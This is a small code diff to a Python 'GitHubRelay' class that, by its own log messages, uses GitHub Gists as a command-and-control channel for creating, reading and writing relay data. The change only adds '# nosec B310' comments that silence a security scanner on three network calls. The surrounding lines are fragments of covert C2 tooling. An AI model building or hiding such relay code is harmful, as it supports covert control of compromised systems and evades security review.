@@ -63,7 +63,7 @@ class GitHubRelay:
             headers=self._headers(),
         )
         try:
-            with urllib.request.urlopen(req, timeout=10) as r:
+            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                 data = json.loads(r.read())
             self._gist_id = data["id"]
             logger.info("c2_relay", f"Gist C2 created: {self._gist_id}")
@@ -166,7 +166,7 @@ class GitHubRelay:
                 f"{self.API_BASE}/gists/{self._gist_id}",
                 headers=self._headers(),
             )
-            with urllib.request.urlopen(req, timeout=10) as r:
+            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                 data = json.loads(r.read())
             content = data["files"]["data.json"]["content"]
             return json.loads(content)
@@ -185,7 +185,7 @@ class GitHubRelay:
             headers=self._headers(),
         )
         try:
-            urllib.request.urlopen(req, timeout=10)
+            urllib.request.urlopen(req, timeout=10)  # nosec B310
         except Exception as e:
             logger.debug("c2_relay", f"Write error: {e}")
 
